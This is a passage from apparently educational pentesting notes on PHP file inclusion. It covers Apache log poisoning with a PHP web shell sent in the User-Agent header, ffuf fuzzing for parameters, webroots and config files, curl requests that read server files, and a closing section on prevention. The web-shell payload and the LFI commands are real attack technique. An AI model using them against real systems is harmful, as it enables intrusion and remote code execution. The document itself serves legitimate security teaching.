
As expected, our custom User-Agent value is visible in the included log file. Now, we can poison the User-Agent header by setting it to a basic PHP web shell (<?php system($_GET['cmd']); ?>).

We may also poison the log by sending a request through cURL, as follows:

```bash
curl -s "http://<SERVER_IP>:<PORT>/index.php" -A "<?php system($_GET['cmd']); ?>"
```

Or if it doesn't works:

```bash
curl -s "http://<SERVER_IP>:<PORT>/index.php" -A "<?php system(\$_GET['cmd']); ?>"
```

As the log should now contain PHP code, the LFI vulnerability should execute this code, and we should be able to gain remote code execution. We can specify a command to be executed with (?cmd=id):

```url
?language=/var/log/apache2/access.log&cmd=id
```

**Tip**: The User-Agent header is also shown on process files under the Linux /proc/ directory. So, we can try including the /proc/self/environ or /proc/self/fd/N files (where N is a PID usually between 0-50), and we may be able to perform the same attack on these files. This may become handy in case we did not have read access over the server logs, however, these files may only be readable by privileged users as well.


Finally, there are other similar log poisoning techniques that we may utilize on various system logs, depending on which logs we have read access over. The following are some of the service logs we may be able to read:
- /var/log/sshd.log
- /var/log/mail
- /var/log/vsftpd.log


<br>
<br>
<br>
<br>

# Automated scanning

### Fuzzing parameters

The HTML forms users can use on the web application front-end tend to be properly tested and well secured against different web attacks. However, in many cases, the page may have other exposed parameters that are not linked to any HTML forms, and hence normal users would never access or unintentionally cause harm through. This is why it may be important to fuzz for exposed parameters, as they tend not to be as secure as public ones.

For example, we can fuzz the page for common GET parameters, as follows:

```bash
ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
```

### LFI wordlists

So far in this module, we have been manually crafting our LFI payloads to test for LFI vulnerabilities. This is because manual testing is more reliable and can find LFI vulnerabilities that may not be identified otherwise, as discussed earlier. However, in many cases, we may want to run a quick test on a parameter to see if it is vulnerable to any common LFI payload, which may save us time in web applications where we need to test for various vulnerabilities.

There are a number of LFI Wordlists we can use for this scan. A good wordlist is **LFI-Jhaddix.txt**, as it contains various bypasses and common files, so it makes it easy to run several tests at once. We can use this wordlist to fuzz the ?language= parameter we have been testing throughout the module, as follows:

```bash
ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
```

### Fuzzing server files

In addition to fuzzing LFI payloads, there are different server files that may be helpful in our LFI exploitation, so it would be helpful to know where such files exist and whether we can read them. Such files include: Server webroot path, server configurations file, and server logs.

We may need to know the full server webroot path to complete our exploitation in some cases. For example, if we wanted to locate a file we uploaded, but we cannot reach its /uploads directory through relative paths (e.g. ../../uploads). In such cases, we may need to figure out the server webroot path so that we can locate our uploaded files through absolute paths instead of relative paths.

To do so, we can fuzz for the index.php file through common webroot paths, which we can find in this wordlist for Linux or this wordlist for Windows. Depending on our LFI situation, we may need to add a few back directories (e.g. ../../../../), and then add our index.php afterwords.

The following is an example of how we can do all of this with ffuf:

```bash
ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
```

As we can see, the scan did indeed identify the correct webroot path at (/var/www/html/). We may also use the same LFI-Jhaddix.txt wordlist we used earlier, as it also contains various payloads that may reveal the webroot. If this does not help us in identifying the webroot, then our best choice would be to read the server configurations, as they tend to contain the webroot and other important information.


### Server logs and configurations

As we have seen in the previous section, we need to be able to identify the correct logs directory to be able to perform the log poisoning attacks we discussed. Furthermore, as we just discussed, we may also need to read the server configurations to be able to identify the server webroot path and other important information (like the logs path!).

To do so, we may also use the LFI-Jhaddix.txt wordlist, as it contains many of the server logs and configuration paths we may be interested in. If we wanted a more precise scan, we can use this wordlist for Linux or this wordlist for Windows, though they are not part of seclists, so we need to download them first. Let's try the Linux wordlist against our LFI vulnerability, and see what we get:

```bash
ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287
```

Now, we can try reading any of these files to see whether we can get their content. We will read (/etc/apache2/apache2.conf), as it is a known path for the apache server configuration:

```bash
curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/apache2.conf
```

As we can see, we do get the default webroot path and the log path. However, in this case, the log path is using a global apache variable (APACHE_LOG_DIR), which are found in another file we saw above, which is (/etc/apache2/envvars), and we can read it to find the variable values:

```bash
curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/envvars
```

As we can see, the (APACHE_LOG_DIR) variable is set to (/var/log/apache2), and the previous configuration told us that the log files are /access.log and /error.log, which have accessed in the previous section.

# LFI tools

The most common LFI tools are LFISuite, LFiFreak, and liffy.

<br>
<br>
<br>
<br>

# File inclusion prevention

The most effective thing we can do to reduce file inclusion vulnerabilities is to avoid passing any user-controlled inputs into any file inclusion functions or APIs. The page should be able to dynamically load assets on the back-end, with no user interaction whatsoever.

Furthermore, in the first section of this module, we discussed different functions that may be utilized to include other files within a page and mentioned the privileges each function has. Whenever any of these functions is used, we should ensure that no user input is directly going into them. Of course, this list of functions is not comprehensive, so we should generally consider any function that can read files.

### Preventing directory traversal

If attackers can control the directory, they can escape the web application and attack something they are more familiar with or use a universal attack chain. As we have discussed throughout the module, directory traversal could potentially allow attackers to do any of the following:

- Read /etc/passwd and potentially find SSH Keys or know valid user names for a password spray attack;
- Find other services on the box such as Tomcat and read the tomcat-users.xml file;
- Discover valid PHP Session Cookies and perform session hijacking;
- Read current web application configuration and source code.

The best way to prevent directory traversal is to use your programming language's (or framework's) built-in tool to pull only the filename. For example, PHP has basename(), which will read the path and only return the filename portion. If only a filename is given, then it will return just the filename. If just the path is given, it will treat whatever is after the final / as the filename. The downside to this method is that if the application needs to enter any directories, it will not be able to do it.

If you create your own function to do this method, it is possible you are not accounting for a weird edge case. For example, in your bash terminal, go into your home directory (cd ~) and run the command cat .?/.*/.?/etc/passwd. You'll see Bash allows for the ? and * wildcards to be used as a .. Now type php -a to enter the PHP Command Line interpreter and run echo file_get_contents('.?/.*/.?/etc/passwd');. You'll see PHP does not have the same behaviour with the wildcards, if you replace ? and * with ., the command will work as expected. This demonstrates there is an edge cases with our above function, if we have PHP execute bash with the system() function, the attacker would be able to bypass our directory traversal prevention. If we use native functions to the framework we are in, there is a chance other users would catch edge cases like this and fix it before it gets exploited in our web application.

Furthermore, we can sanitize the user input to recursively remove any attempts of traversing directories, as follows:

```php
while(substr_count($input, '../', 0)) {
    $input = str_replace('../', '', $input);
};
```

As we can see, this code recursively removes ../ sub-strings, so even if the resulting string contains ../ it would still remove it, which would prevent some of the bypasses we attempted in this module.

### Web server configuration

Several configurations may also be utilized to reduce the impact of file inclusion vulnerabilities in case they occurs. For example, we should globally disable the inclusion of remote files. In PHP this can be done by setting allow_url_fopen and allow_url_include to Off.

It's also often possible to lock web applications to their web root directory, preventing them from accessing non-web related files. The most common way to do this in today's age is by running the application within Docker.

However, if that is not an option, many languages often have a way to prevent accessing files outside of the web directory. In PHP that can be done by adding open_basedir = /var/www in the php.ini file. Furthermore, you should ensure that certain potentially dangerous modules are disabled, like PHP Expect mod_userdir.

### Web application firewall (WAF)

The universal way to harden applications is to utilize a Web Application Firewall (WAF), such as ModSecurity. When dealing with WAFs, the most important thing to avoid is false positives and blocking non-malicious requests. ModSecurity minimizes false positives by offering a permissive mode, which will only report things it would have blocked. This lets defenders tune the rules to make sure no legitimate request is blocked.

